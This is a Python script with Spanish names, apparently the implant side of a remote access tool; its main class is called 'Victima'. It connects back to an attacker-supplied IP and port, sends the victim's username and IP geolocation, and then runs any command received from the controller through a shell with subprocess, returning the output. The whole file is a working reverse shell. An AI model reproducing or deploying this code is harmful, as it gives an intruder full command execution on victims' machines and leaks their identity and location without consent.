
import os
import sys
import time
import socket
import json
import subprocess
import urllib.request
from getpass import getuser


class Victima(object):

	def __init__(self, ip, port):

		super(Victima, self).__init__()
		self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.direccion = str(ip)
		self.puerto = int(port)


	def iniciar(self):
		self.client.connect((self.direccion, self.puerto))
		return


	def detener(self):
		self.client.close()
		return


	def enviar(self,msg):
		self.client.send(bytes(msg,"utf-8"))
		return


	def recibir(self):
		raw_msg = self.client.recv(1024) 
		msg = (raw_msg).decode('utf-8')
		return msg


	def obtener_informacion(self):
		host = getuser()		
		url = urllib.request.urlopen("https://geoip-db.com/json")
		objeto = json.loads(url.read().decode())
		ip_info = objeto["city"] + "," + objeto["IPv4"] + "," + objeto["country_name"] + "," + objeto["state"]
		return [host,ip_info]


	def enviar_informacion(self):
		informacion = self.obtener_informacion()
		self.enviar(informacion[0])
		self.recibir()
		self.enviar(informacion[1])
		return	


	def control_total(self):
		while (True):
			datosEleccion = self.recibir()

			if (datosEleccion=="matar"):
				self.client.close();
				break

			elif (datosEleccion=="cmd"):
				self.cmd()			

		return


	def cmd(self):
		
		datos = self.recibir()

		while(True):

			if("cd " in datos):
				directorio = datos.replace('cd ', "")
				
				try:
					os.chdir(directorio)
					self.client.send(bytes("\n Ubicacion cambiada a: " + directorio,"utf-8"))
				except OSError: 
					self.client.send(bytes("\n No existe la ubicacion...",'utf-8'))

			elif (datos=='detener'):
				print('estoy deteniendome')
				self.enviar("ok")
				break


			else:
				comando = subprocess.Popen (datos, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
				salida_texto = comando.stdout.read() + comando.stderr.read()
				salida_completa = (salida_texto).decode('utf-8') + "\n Comando utilizado: "+datos
				self.enviar(salida_completa)

			datos = self.recibir()

			print(datos)

		return



def main(direccion,puerto):

	s = Victima(direccion,puerto)	
	s.iniciar()
	s.enviar_informacion()
	s.control_total()


if __name__ == '__main__':
	
	direccion=sys.argv[1]
	puerto=sys.argv[2]

	main(direccion,puerto)